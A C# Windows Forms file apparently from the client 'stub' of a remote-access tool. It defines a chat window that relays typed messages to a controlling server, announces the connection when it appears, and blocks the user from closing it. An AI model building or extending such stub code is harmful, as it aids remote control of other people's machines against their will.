using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using VanillaStub.Helpers;
using VanillaStub.Helpers.Networking;

namespace VanillaStub.Forms
{
    public partial class Chat : Form
    {
        public Chat()
        {
            InitializeComponent();
        }

        //Prevent form closing
        private void OnClosing(object sender, FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing)
                e.Cancel = true;
        }

        //Send message by button
        private void btnSend_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtChat.Text))
                txtChat.Text = "You: " + txtSend.Text;
            else
                txtChat.AppendText(Environment.NewLine + "You: " + txtSend.Text);
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int) DataType.MessageType);
            ToSend.AddRange(Encoding.ASCII.GetBytes(txtSend.Text));
            Networking.MainClient.Send(ToSend.ToArray());
            txtSend.Text = "";
        }

        //If enter key is pressed, send message
        private void KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                if (string.IsNullOrWhiteSpace(txtChat.Text))
                    txtChat.Text = "You: " + txtSend.Text;
                else
                    txtChat.AppendText(Environment.NewLine + "You: " + txtSend.Text);
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.MessageType);
                ToSend.AddRange(Encoding.ASCII.GetBytes(txtSend.Text));
                Networking.MainClient.Send(ToSend.ToArray());
                txtSend.Text = "";
            }
        }

        //Tell server client is connected if visible
        private void OnVisibleChange(object sender, EventArgs e)
        {
            if (Visible)
            {
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.MessageType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("Connected to chat"));
                Networking.MainClient.Send(ToSend.ToArray());
            }
        }
    }
}